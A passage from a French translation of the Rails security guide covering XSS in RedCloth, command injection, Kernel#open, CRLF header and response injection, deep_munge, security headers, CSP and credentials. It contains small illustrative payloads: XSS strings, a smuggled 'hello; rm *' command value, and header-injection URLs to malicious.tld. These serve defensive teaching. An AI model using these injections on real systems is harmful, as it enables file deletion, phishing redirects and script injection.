Par exemple, RedCloth traduit `_test_` en `<em>test<em>`, ce qui rend le texte en italique. Cependant, jusqu'à la version actuelle 3.0.4, il est toujours vulnérable aux XSS. Obtenez la [nouvelle version 4](http://www.redcloth.org) qui a supprimé des bugs graves. Cependant, même cette version a [quelques bugs de sécurité](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), donc les contre-mesures s'appliquent toujours. Voici un exemple pour la version 3.0.4 :

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Utilisez l'option `:filter_html` pour supprimer le HTML qui n'a pas été créé par le processeur Textile.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

Cependant, cela ne filtre pas tout le HTML, quelques balises seront laissées (par conception), par exemple `<a>` :

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Contremesures

Il est recommandé d'_utiliser RedCloth en combinaison avec un filtre d'entrée autorisé_, comme décrit dans la section des contre-mesures contre les XSS.

### Injection Ajax

NOTE : _Les mêmes précautions de sécurité doivent être prises pour les actions Ajax que pour les actions "normales". Il y a au moins une exception, cependant : la sortie doit être échappée dans le contrôleur déjà, si l'action ne rend pas une vue._

Si vous utilisez le plugin [in_place_editor](https://rubygems.org/gems/in_place_editing), ou des actions qui renvoient une chaîne de caractères plutôt que de rendre une vue, _vous devez échapper la valeur de retour dans l'action_. Sinon, si la valeur de retour contient une chaîne XSS, le code malveillant sera exécuté lors du retour au navigateur. Échappez toute valeur d'entrée en utilisant la méthode `h()`.

### Injection de ligne de commande

NOTE : _Utilisez les paramètres de ligne de commande fournis par l'utilisateur avec prudence._

Si votre application doit exécuter des commandes dans le système d'exploitation sous-jacent, il existe plusieurs méthodes en Ruby : `system(commande)`, `exec(commande)`, `spawn(commande)` et `` `commande` ``. Vous devrez être particulièrement prudent avec ces fonctions si l'utilisateur peut entrer la commande entière, ou une partie de celle-ci. Cela est dû au fait que dans la plupart des shells, vous pouvez exécuter une autre commande à la fin de la première, en les concaténant avec un point-virgule (`;`) ou une barre verticale (`|`).

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# affiche "hello" et supprime les fichiers dans le répertoire courant
```

Une contre-mesure consiste à _utiliser la méthode `system(commande, paramètres)` qui passe les paramètres de ligne de commande en toute sécurité_.

```ruby
system("/bin/echo", "hello; rm *")
# affiche "hello; rm *" et ne supprime pas les fichiers
```

#### Vulnérabilité de Kernel#open

`Kernel#open` exécute une commande du système d'exploitation si l'argument commence par une barre verticale (`|`).

```ruby
open('| ls') { |file| file.read }
# renvoie la liste des fichiers sous forme de chaîne via la commande `ls`
```

Les contre-mesures consistent à utiliser `File.open`, `IO.open` ou `URI#open` à la place. Ils n'exécutent pas de commande du système d'exploitation.

```ruby
File.open('| ls') { |file| file.read }
# n'exécute pas la commande `ls`, ouvre simplement le fichier `| ls` s'il existe

IO.open(0) { |file| file.read }
# ouvre stdin. n'accepte pas une chaîne de caractères comme argument

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# ouvre l'URI. `URI()` n'accepte pas `| ls`
```

### Injection d'en-tête

AVERTISSEMENT : _Les en-têtes HTTP sont générés dynamiquement et dans certaines circonstances, une entrée utilisateur peut être injectée. Cela peut entraîner une fausse redirection, des XSS ou une division de réponse HTTP._

Les en-têtes de requête HTTP ont un champ Referer, User-Agent (logiciel client) et Cookie, entre autres. Les en-têtes de réponse, par exemple, ont un code d'état, un Cookie et un champ Location (URL de redirection cible). Tous sont fournis par l'utilisateur et peuvent être manipulés avec plus ou moins d'efforts. _N'oubliez pas d'échapper ces champs d'en-tête, également._ Par exemple, lorsque vous affichez l'agent utilisateur dans une zone d'administration.
En plus de cela, il est _important de savoir ce que vous faites lorsque vous construisez des en-têtes de réponse en partie basés sur l'entrée de l'utilisateur._ Par exemple, si vous souhaitez rediriger l'utilisateur vers une page spécifique. Pour ce faire, vous avez introduit un champ "referer" dans un formulaire pour rediriger vers l'adresse donnée :

```ruby
redirect_to params[:referer]
```

Ce que fait Rails, c'est qu'il place la chaîne dans le champ d'en-tête `Location` et envoie un statut 302 (redirection) au navigateur. La première chose qu'un utilisateur malveillant ferait, c'est cela :

```
http://www.votreapplication.com/controleur/action?referer=http://www.malicious.tld
```

Et en raison d'un bogue dans (Ruby et) Rails jusqu'à la version 2.1.2 (exclue), un pirate informatique peut injecter des champs d'en-tête arbitraires ; par exemple, comme ceci :

```
http://www.votreapplication.com/controleur/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.votreapplication.com/controleur/action?referer=chemin/vers/votre/app%0d%0aLocation:+http://www.malicious.tld
```

Notez que `%0d%0a` est encodé en URL pour `\r\n`, qui est un retour chariot et un saut de ligne (CRLF) en Ruby. Ainsi, l'en-tête HTTP résultant pour le deuxième exemple sera le suivant, car le deuxième champ d'en-tête Location écrase le premier.

```http
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

Ainsi, _les vecteurs d'attaque pour l'injection d'en-tête sont basés sur l'injection de caractères CRLF dans un champ d'en-tête._ Et que pourrait faire un attaquant avec une fausse redirection ? Il pourrait rediriger vers un site de phishing qui ressemble au vôtre, mais qui demande de se connecter à nouveau (et envoie les informations d'identification de connexion à l'attaquant). Ou il pourrait installer un logiciel malveillant via des failles de sécurité du navigateur sur ce site. Rails 2.1.2 échappe à ces caractères pour le champ Location dans la méthode `redirect_to`. _Assurez-vous de le faire vous-même lorsque vous construisez d'autres champs d'en-tête avec l'entrée de l'utilisateur._

#### Attaques DNS Rebinding et Host Header

Le rebinding DNS est une méthode de manipulation de la résolution des noms de domaine qui est couramment utilisée comme forme d'attaque informatique. Le rebinding DNS contourne la politique de même origine en abusant du système de noms de domaine (DNS). Il réassocie un domaine à une adresse IP différente, puis compromet le système en exécutant un code aléatoire contre votre application Rails à partir de l'adresse IP modifiée.

Il est recommandé d'utiliser le middleware `ActionDispatch::HostAuthorization` pour se protéger contre les attaques de rebinding DNS et autres attaques d'en-tête Host. Il est activé par défaut dans l'environnement de développement, vous devez l'activer en production et dans d'autres environnements en définissant la liste des hôtes autorisés. Vous pouvez également configurer des exceptions et définir votre propre application de réponse.

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # Exclure les requêtes pour le chemin /healthcheck/ de la vérification de l'hôte
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # Ajouter une application Rack personnalisée pour la réponse
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

Vous pouvez en savoir plus à ce sujet dans la documentation du middleware [`ActionDispatch::HostAuthorization`](/configuring.html#actiondispatch-hostauthorization)

#### Injection de réponse

Si l'injection d'en-tête était possible, l'injection de réponse pourrait l'être aussi. En HTTP, le bloc d'en-tête est suivi de deux CRLFs et des données réelles (généralement HTML). L'idée de l'injection de réponse est d'injecter deux CRLFs dans un champ d'en-tête, suivi d'une autre réponse avec du HTML malveillant. La réponse sera la suivante :

```http
HTTP/1.1 302 Found [Première réponse standard 302]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [Deuxième nouvelle réponse créée par l'attaquant commence]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Une entrée malveillante arbitraire est
Keep-Alive: timeout=15, max=100         affichée comme la page redirigée]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Dans certaines circonstances, cela présenterait le HTML malveillant à la victime. Cependant, cela ne semble fonctionner qu'avec les connexions Keep-Alive (et de nombreux navigateurs utilisent des connexions ponctuelles). Mais vous ne pouvez pas vous fier à cela. _Dans tous les cas, il s'agit d'un bogue sérieux, et vous devriez mettre à jour votre version de Rails en version 2.0.5 ou 2.1.2 pour éliminer les risques d'injection d'en-tête (et donc de division de réponse)._ 

Génération de requête non sécurisée
-----------------------------------

En raison de la façon dont Active Record interprète les paramètres en combinaison avec la façon dont Rack analyse les paramètres de requête, il était possible d'émettre des requêtes inattendues à la base de données avec des clauses `IS NULL`. En réponse à ce problème de sécurité ([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ), [CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) et [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)), la méthode `deep_munge` a été introduite comme solution pour maintenir Rails sécurisé par défaut.

Voici un exemple de code vulnérable qui pourrait être utilisé par un attaquant si `deep_munge` n'était pas effectué :

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

Lorsque `params[:token]` est l'un des suivants : `[nil]`, `[nil, nil, ...]` ou `['foo', nil]`, il contournera le test pour `nil`, mais les clauses `IS NULL` ou `IN ('foo', NULL)` seront toujours ajoutées à la requête SQL.
Pour maintenir la sécurité par défaut de Rails, `deep_munge` remplace certaines valeurs par `nil`. Le tableau ci-dessous montre à quoi ressemblent les paramètres en fonction du `JSON` envoyé dans la requête :

| JSON                              | Paramètres               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

Il est possible de revenir au comportement précédent et de désactiver `deep_munge` en configurant votre application si vous êtes conscient du risque et savez comment le gérer :

```ruby
config.action_dispatch.perform_deep_munge = false
```

En-têtes de sécurité HTTP
---------------------

Pour améliorer la sécurité de votre application, Rails peut être configuré pour renvoyer des en-têtes de sécurité HTTP. Certains en-têtes sont configurés par défaut ; d'autres doivent être configurés explicitement.

### En-têtes de sécurité par défaut

Par défaut, Rails est configuré pour renvoyer les en-têtes de réponse suivants. Votre application renvoie ces en-têtes pour chaque réponse HTTP.

#### `X-Frame-Options`

L'en-tête [`X-Frame-Options`][] indique si un navigateur peut afficher la page dans une balise `<frame>`, `<iframe>`, `<embed>` ou `<object>`. Cet en-tête est défini sur `SAMEORIGIN` par défaut pour autoriser l'affichage sur le même domaine uniquement. Définissez-le sur `DENY` pour refuser totalement l'affichage dans une frame, ou supprimez complètement cet en-tête si vous souhaitez autoriser l'affichage sur tous les domaines.

#### `X-XSS-Protection`

Un en-tête [obsolète](https://owasp.org/www-project-secure-headers/#x-xss-protection) hérité, défini sur `0` par défaut dans Rails pour désactiver les anciens auditeurs XSS problématiques.

#### `X-Content-Type-Options`

L'en-tête [`X-Content-Type-Options`][] est défini sur `nosniff` par défaut dans Rails. Il empêche le navigateur de deviner le type MIME d'un fichier.

#### `X-Permitted-Cross-Domain-Policies`

Cet en-tête est défini sur `none` par défaut dans Rails. Il interdit aux clients Adobe Flash et PDF d'intégrer votre page sur d'autres domaines.

#### `Referrer-Policy`

L'en-tête [`Referrer-Policy`][] est défini sur `strict-origin-when-cross-origin` par défaut dans Rails. Pour les requêtes cross-origin, cela envoie uniquement l'origine dans l'en-tête Referer. Cela empêche les fuites de données privées qui peuvent être accessibles à partir d'autres parties de l'URL complète, telles que le chemin et la chaîne de requête.

#### Configuration des en-têtes par défaut

Ces en-têtes sont configurés par défaut comme suit :

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

Vous pouvez les remplacer ou ajouter des en-têtes supplémentaires dans `config/application.rb` :

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

Ou vous pouvez les supprimer :

```ruby
config.action_dispatch.default_headers.clear
```

### En-tête `Strict-Transport-Security`

L'en-tête HTTP [`Strict-Transport-Security`][] (HTST) garantit que le navigateur passe automatiquement en HTTPS pour les connexions actuelles et futures.

L'en-tête est ajouté à la réponse lors de l'activation de l'option `force_ssl` :

```ruby
  config.force_ssl = true
```

### En-tête `Content-Security-Policy`

Pour aider à protéger contre les attaques XSS et d'injection, il est recommandé de définir un en-tête de réponse [`Content-Security-Policy`][] pour votre application. Rails fournit un DSL qui vous permet de configurer l'en-tête.

Définissez la politique de sécurité dans l'initialiseur approprié :

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Spécifiez l'URI pour les rapports de violation
  policy.report_uri "/csp-violation-report-endpoint"
end
```

La politique globalement configurée peut être remplacée pour chaque ressource :

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

Ou elle peut être désactivée :

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Utilisez des lambdas pour injecter des valeurs spécifiques à la requête, telles que des sous-domaines de compte dans une application multi-locataire :

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### Signalement des violations

Activez la directive [`report-uri`][] pour signaler les violations à l'URI spécifiée :

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Lors de la migration du contenu existant, vous voudrez peut-être signaler les violations sans appliquer la politique. Définissez l'en-tête de réponse [`Content-Security-Policy-Report-Only`][] pour signaler uniquement les violations :

```ruby
Rails.application.config.content_security_policy_report_only = true
```

Ou remplacez-le dans un contrôleur :

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### Ajout d'un nonce

Si vous envisagez d'utiliser `'unsafe-inline'`, envisagez plutôt d'utiliser des nonces. [Les nonces offrent une amélioration substantielle](https://www.w3.org/TR/CSP3/#security-nonces) par rapport à `'unsafe-inline'` lors de la mise en œuvre d'une politique de sécurité du contenu sur du code existant.
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

Il y a quelques compromis à prendre en compte lors de la configuration du générateur de nonce.
L'utilisation de `SecureRandom.base64(16)` est une bonne valeur par défaut, car elle générera un nouveau nonce aléatoire pour chaque requête. Cependant, cette méthode est incompatible avec la [mise en cache GET conditionnelle](caching_with_rails.html#conditional-get-support)
car de nouveaux nonces entraîneront de nouvelles valeurs ETag pour chaque requête. Une
alternative aux nonces aléatoires par requête serait d'utiliser l'identifiant de session :

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

Cette méthode de génération est compatible avec les ETags, mais sa sécurité dépend de
l'identifiant de session étant suffisamment aléatoire et ne pas être exposé dans des
cookies non sécurisés.

Par défaut, les nonces seront appliqués à `script-src` et `style-src` si un générateur de nonce est défini. `config.content_security_policy_nonce_directives` peut être
utilisé pour modifier les directives qui utiliseront des nonces :

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

Une fois que la génération de nonce est configurée dans un initialiseur, des valeurs de nonce automatiques
peuvent être ajoutées aux balises de script en passant `nonce: true` dans `html_options` :

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Bonjour, le monde !');
<% end -%>
```

La même chose fonctionne avec `javascript_include_tag` :

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

Utilisez l'aide [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
pour créer une balise meta "csp-nonce" avec la valeur de nonce par session
pour autoriser les balises `<script>` en ligne.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

Cela est utilisé par l'aide Rails UJS pour créer dynamiquement
des éléments `<script>` en ligne.

### En-tête `Feature-Policy`

REMARQUE : L'en-tête `Feature-Policy` a été renommé en `Permissions-Policy`.
Le `Permissions-Policy` nécessite une implémentation différente et n'est pas
encore pris en charge par tous les navigateurs. Pour éviter de devoir renommer ce
middleware à l'avenir, nous utilisons le nouveau nom pour le middleware mais
gardons l'ancien nom d'en-tête et son implémentation pour le moment.

Pour autoriser ou bloquer l'utilisation des fonctionnalités du navigateur, vous pouvez définir un en-tête de réponse [`Feature-Policy`][]
pour votre application. Rails fournit un DSL qui vous permet de
configurer l'en-tête.

Définissez la politique dans l'initialiseur approprié :

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

La politique configurée globalement peut être remplacée pour chaque ressource :

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### Partage des ressources entre origines différentes (CORS)

Les navigateurs restreignent les requêtes HTTP entre origines différentes initiées par des scripts. Si vous
voulez exécuter Rails en tant qu'API et exécuter une application frontend sur un domaine séparé, vous
avez besoin d'activer le [partage des ressources entre origines différentes](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS).

Vous pouvez utiliser le middleware [Rack CORS](https://github.com/cyu/rack-cors) pour
gérer le CORS. Si vous avez généré votre application avec l'option `--api`,
Rack CORS a probablement déjà été configuré et vous pouvez ignorer les étapes suivantes.

Pour commencer, ajoutez la gemme rack-cors à votre Gemfile :

```ruby
gem 'rack-cors'
```

Ensuite, ajoutez un initialiseur pour configurer le middleware :

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

Sécurité de l'intranet et de l'administration
---------------------------

Les intranets et les interfaces d'administration sont des cibles d'attaque populaires, car elles permettent un accès privilégié. Bien que cela nécessiterait plusieurs mesures de sécurité supplémentaires, c'est le contraire qui se produit dans le monde réel.

En 2007, le premier cheval de Troie sur mesure a été créé pour voler des informations à partir d'un intranet, à savoir le site web "Monster for employers" de Monster.com, une application web de recrutement en ligne. Les chevaux de Troie sur mesure sont très rares jusqu'à présent et le risque est assez faible, mais c'est certainement une possibilité et un exemple de l'importance de la sécurité de l'hôte client. Cependant, la plus grande menace pour les applications intranet et d'administration est le XSS et le CSRF.

### Cross-Site Scripting

Si votre application réaffiche une entrée utilisateur malveillante provenant de l'extranet, l'application sera vulnérable au XSS. Les noms d'utilisateur, les commentaires, les signalements de spam, les adresses de commande sont quelques exemples peu communs où il peut y avoir du XSS.

Avoir un seul endroit dans l'interface d'administration ou l'intranet où l'entrée n'a pas été désinfectée rend toute l'application vulnérable. Les exploits possibles incluent le vol du cookie de l'administrateur privilégié, l'injection d'un iframe pour voler le mot de passe de l'administrateur ou l'installation d'un logiciel malveillant via des failles de sécurité du navigateur pour prendre le contrôle de l'ordinateur de l'administrateur.

Consultez la section Injection pour les contre-mesures contre le XSS.

### Cross-Site Request Forgery
La falsification de requête intersites (CSRF), également connue sous le nom de falsification de référence intersites (XSRF), est une méthode d'attaque gigantesque qui permet à l'attaquant de faire tout ce que l'administrateur ou l'utilisateur de l'intranet peut faire. Comme vous l'avez déjà vu ci-dessus, voici quelques exemples de ce que les attaquants peuvent faire dans l'intranet ou l'interface d'administration.

Un exemple concret est la [reconfiguration d'un routeur par CSRF](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html). Les attaquants ont envoyé un e-mail malveillant, avec du CSRF dedans, aux utilisateurs mexicains. L'e-mail prétendait qu'une carte électronique attendait l'utilisateur, mais il contenait également une balise d'image qui entraînait une requête HTTP-GET pour reconfigurer le routeur de l'utilisateur (qui est un modèle populaire au Mexique). La requête a modifié les paramètres DNS de sorte que les requêtes vers un site bancaire basé au Mexique soient redirigées vers le site de l'attaquant. Tous ceux qui ont accédé au site bancaire via ce routeur ont vu le faux site de l'attaquant et ont eu leurs identifiants volés.

Un autre exemple a changé l'adresse e-mail et le mot de passe de Google Adsense. Si la victime était connectée à Google Adsense, l'interface d'administration des campagnes publicitaires de Google, un attaquant pouvait changer les identifiants de la victime.

Une autre attaque populaire consiste à spammer votre application web, votre blog ou votre forum pour propager des XSS malveillants. Bien sûr, l'attaquant doit connaître la structure de l'URL, mais la plupart des URL Rails sont assez simples ou faciles à découvrir, s'il s'agit de l'interface d'administration d'une application open source. L'attaquant peut même faire 1 000 suppositions chanceuses en incluant simplement des balises IMG malveillantes qui essaient toutes les combinaisons possibles.

Pour les _contre-mesures contre le CSRF dans les interfaces d'administration et les applications intranet, reportez-vous aux contre-mesures de la section CSRF_.

### Précautions supplémentaires

L'interface d'administration classique fonctionne comme ceci : elle est située à www.example.com/admin, peut être accédée uniquement si le drapeau admin est activé dans le modèle User, réaffiche les entrées utilisateur et permet à l'administrateur de supprimer/ajouter/modifier les données souhaitées. Voici quelques réflexions à ce sujet :

* Il est très important de _penser au pire des cas_ : Que se passerait-il si quelqu'un obtenait vraiment vos cookies ou vos identifiants utilisateur. Vous pourriez _introduire des rôles_ pour l'interface d'administration afin de limiter les possibilités de l'attaquant. Ou que diriez-vous de _crédentiels de connexion spéciaux_ pour l'interface d'administration, autres que ceux utilisés pour la partie publique de l'application. Ou un _mot de passe spécial pour les actions très sérieuses_ ?

* L'administrateur doit-il vraiment accéder à l'interface depuis n'importe où dans le monde ? Pensez à _limiter la connexion à un ensemble d'adresses IP source_. Examinez request.remote_ip pour connaître l'adresse IP de l'utilisateur. Ce n'est pas infaillible, mais c'est une excellente barrière. N'oubliez pas qu'il peut y avoir un proxy en cours d'utilisation, cependant.

* _Placez l'interface d'administration sur un sous-domaine spécial_ tel que admin.application.com et faites-en une application distincte avec sa propre gestion des utilisateurs. Cela rend impossible le vol d'un cookie d'administration depuis le domaine habituel, www.application.com. Cela est dû à la politique de même origine de votre navigateur : un script injecté (XSS) sur www.application.com ne peut pas lire le cookie pour admin.application.com et vice versa.

Sécurité environnementale
-------------------------

Il est hors de portée de ce guide de vous informer sur la sécurisation de votre code d'application et de vos environnements. Cependant, veuillez sécuriser votre configuration de base de données, par exemple `config/database.yml`, la clé principale pour `credentials.yml` et autres secrets non chiffrés. Vous voudrez peut-être restreindre davantage l'accès en utilisant des versions spécifiques à l'environnement de ces fichiers et de tout autre fichier pouvant contenir des informations sensibles.

### Identifiants personnalisés

Rails stocke les secrets dans `config/credentials.yml.enc`, qui est chiffré et ne peut donc pas être modifié directement. Rails utilise `config/master.key` ou recherche alternativement la variable d'environnement `ENV["RAILS_MASTER_KEY"]` pour chiffrer le fichier des identifiants. Étant donné que le fichier des identifiants est chiffré, il peut être stocké dans un système de contrôle de version, à condition que la clé principale soit conservée en sécurité.

Par défaut, le fichier des identifiants contient la `secret_key_base` de l'application. Il peut également être utilisé pour stocker d'autres secrets tels que des clés d'accès pour des API externes.

Pour modifier le fichier des identifiants, exécutez `bin/rails credentials:edit`. Cette commande créera le fichier des identifiants s'il n'existe pas. De plus, cette commande créera `config/master.key` s'il n'y a pas de clé principale définie.

Les secrets conservés dans le fichier des identifiants sont accessibles via `Rails.application.credentials`.
Par exemple, avec le fichier des identifiants décrypté suivant `config/credentials.yml.enc` :

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key` renvoie `"SOMEKEY"`. `Rails.application.credentials.system.access_key_id` renvoie `"1234AB"`.
Si vous souhaitez qu'une exception soit levée lorsque certaines clés sont vides, vous pouvez utiliser la version bang :

```ruby
# Lorsque some_api_key est vide...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key est vide
```

CONSEIL : En savoir plus sur les informations d'identification avec `bin/rails credentials:help`.

AVERTISSEMENT : Gardez votre clé principale en sécurité. Ne la commitez pas.

Gestion des dépendances et CVE
------------------------------

Nous ne mettons pas à jour les dépendances simplement pour encourager l'utilisation de nouvelles versions, y compris pour des problèmes de sécurité. Cela est dû au fait que les propriétaires d'applications doivent mettre à jour manuellement leurs gemmes, indépendamment de nos efforts. Utilisez `bundle update --conservative nom_de_la_gemme` pour mettre à jour en toute sécurité les dépendances vulnérables.

Ressources supplémentaires
--------------------

Le paysage de la sécurité évolue et il est important de rester à jour, car manquer une nouvelle vulnérabilité peut être catastrophique. Vous pouvez trouver des ressources supplémentaires sur la sécurité (Rails) ici :

* Abonnez-vous à la liste de diffusion de sécurité de Rails [mailing list](https://discuss.rubyonrails.org/c/security-announcements/9).
* [Brakeman - Scanner de sécurité Rails](https://brakemanscanner.org/) - Pour effectuer une analyse de sécurité statique des applications Rails.
* [Lignes directrices de sécurité Web de Mozilla](https://infosec.mozilla.org/guidelines/web_security.html) - Recommandations sur des sujets tels que la politique de sécurité du contenu, les en-têtes HTTP, les cookies, la configuration TLS, etc.
* Un [bon blog sur la sécurité](https://owasp.org/) comprenant la [feuille de triche sur la prévention des attaques par injection de code](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md).
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
